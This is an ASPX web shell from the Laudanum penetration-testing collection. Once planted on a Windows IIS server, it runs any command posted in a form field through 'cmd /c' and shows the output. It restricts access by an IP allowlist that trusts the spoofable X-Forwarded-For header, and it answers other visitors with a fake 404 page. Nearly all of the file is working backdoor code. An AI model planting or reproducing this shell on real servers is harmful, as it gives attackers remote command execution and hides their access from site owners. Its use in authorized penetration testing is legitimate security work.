<%@ Page Language="C#"%>
<%@ Import Namespace="System" %>

<script runat="server">

/* *****************************************************************************
***
*** Laudanum Project
*** A Collection of Injectable Files used during a Penetration Test
***
*** More information is available at:
***  http://laudanum.secureideas.net
***  laudanum@secureideas.net
***
***  Project Leads:
***         Kevin Johnson <kjohnson@secureideas.net>
***         Tim Medin <tim@securitywhole.com>
***
*** Copyright 2012 by Kevin Johnson and the Laudanum Team
***
********************************************************************************
***
*** This file provides shell access to the system.
***
********************************************************************************
*** This program is free software; you can redistribute it and/or
*** modify it under the terms of the GNU General Public License
*** as published by the Free Software Foundation; either version 2
*** of the License, or (at your option) any later version.
***
*** This program is distributed in the hope that it will be useful,
*** but WITHOUT ANY WARRANTY; without even the implied warranty of
*** MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
*** GNU General Public License for more details.
***
*** You can get a copy of the GNU General Public License from this
*** address: http://www.gnu.org/copyleft/gpl.html#SEC1
*** You can also write to the Free Software Foundation, Inc., 59 Temple
*** Place - Suite 330, Boston, MA  02111-1307, USA.
***
***************************************************************************** */

string stdout = "";
string stderr = "";

void die() {
	//HttpContext.Current.Response.Clear();
	HttpContext.Current.Response.StatusCode = 404;
	HttpContext.Current.Response.StatusDescription = "Not Found";
	HttpContext.Current.Response.Write("<h1>404 Not Found</h1>");
	HttpContext.Current.Server.ClearError();
	HttpContext.Current.Response.End();
}

void Page_Load(object sender, System.EventArgs e) {

	// Check for an IP in the range we want
	string[] allowedIps = new string[] {"::1","192.168.0.1", "127.0.0.1"};
	
	// check if the X-Fordarded-For header exits
	string remoteIp;
	if (HttpContext.Current.Request.Headers["X-Forwarded-For"] == null) {
		remoteIp = Request.UserHostAddress;
	} else {
		remoteIp = HttpContext.Current.Request.Headers["X-Forwarded-For"].Split(new char[] { ',' })[0]; 
	}

	bool validIp = false;
	foreach (string ip in allowedIps) {
		validIp = (validIp || (remoteIp == ip));
	}
	
	if (!validIp) {
		die();
	}
	
	if (Request.Form["c"] != null) {
	// do or do not, there is no try
	//try {
		// create the ProcessStartInfo using "cmd" as the program to be run, and "/c " as the parameters.
		// "/c" tells cmd that we want it to execute the command that follows, and exit.
		System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo("cmd", "/c " + Request.Form["c"]);

		// The following commands are needed to redirect the standard output and standard error.
		procStartInfo.RedirectStandardOutput = true;
		procStartInfo.RedirectStandardError = true;
		procStartInfo.UseShellExecute = false;
		// Do not create the black window.
		procStartInfo.CreateNoWindow = true;
		// Now we create a process, assign its ProcessStartInfo and start it
		System.Diagnostics.Process p = new System.Diagnostics.Process();
		p.StartInfo = procStartInfo;
		p.Start();
		// Get the output and error into a string
		stdout = p.StandardOutput.ReadToEnd();
		stderr = p.StandardError.ReadToEnd();
	//}
	//catch (Exception objException)
	//{
	}
}
</script>
<html>
<head><title>Laundanum ASPX Shell</title></head>
<body onload="document.shell.c.focus()">

<form method="post" name="shell">
cmd /c <input type="text" name="c"/>
<input type="submit"><br/>
STDOUT:<br/>
<pre><% = stdout.Replace("<", "&lt;") %></pre>
<br/>
<br/>
<br/>
STDERR:<br/>
<pre><% = stderr.Replace("<", "&lt;") %></pre>


</form>

  <hr/>
  <address>
  Copyright &copy; 2012, <a href="mailto:laudanum@secureideas.net">Kevin Johnson</a> and the Laudanum team.<br/>
  Written by Tim Medin.<br/>
  Get the latest version at <a href="http://laudanum.secureideas.net">laudanum.secureideas.net</a>.
  </address>

</body>
</html>